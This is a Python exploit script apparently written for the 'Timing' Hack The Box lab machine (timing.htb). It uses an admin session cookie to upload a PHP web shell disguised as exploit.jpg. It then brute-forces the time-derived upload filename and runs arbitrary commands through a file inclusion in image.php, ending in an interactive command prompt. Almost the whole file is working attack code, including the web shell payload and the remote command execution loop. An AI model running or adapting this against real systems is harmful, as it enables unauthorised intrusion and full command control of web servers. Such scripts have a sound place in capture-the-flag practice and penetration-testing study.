import requests
import os
import time
import threading


#Current URL=http://timing.htb
def upload_post_req():
	burp0_url = "http://timing.htb:80/upload.php"
	burp0_cookies = {"PHPSESSID": "s4fd94a25erqq1ctja065vfs1s"} #Change this cookie to our admin cookie
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------358100878512268049331587005052", "Origin": "http://timing.htb", "Connection": "close", "Referer": "http://timing.htb/avatar_uploader.php"}
	burp0_data = "-----------------------------358100878512268049331587005052\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"exploit.jpg\"\r\nContent-Type: txt/php\r\n\r\n<?php system($_GET['cmd']); ?>\n\r\n-----------------------------358100878512268049331587005052--\r\n"
	r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
	
def fname_generator():
	print("Running...")
	for i in range(15):
		os.system("php -f fname_generator.php >> output.txt")
		if(i==6):
			threading.Thread(target=upload_post_req).start()
		time.sleep(1)


def response_c(filename):
	VECTOR="http://timing.htb/images/uploads/"
	r=requests.get(VECTOR+str(filename))
	return r.status_code

def injector(filename, cmd):
	VECTOR="http://timing.htb/image.php?img=images/uploads/"
	r=requests.get(VECTOR+filename+"&cmd="+cmd)
	print(r.text)

if __name__ == "__main__":	

	fname_generator()
	
	hash_names=[]
	f = open("output.txt", "r")
	for i in range(15):
		hash_names.append(f.readline().strip("\n"))
	f.close()
	
	for filename in hash_names:
		if str(response_c(filename))=="200":
			os.system("clear")
			print("Success!")
			while(1):
				cmd=input("> ")
				injector(filename, cmd)
				if cmd=="exit":
					break
	
	os.system("rm output.txt")
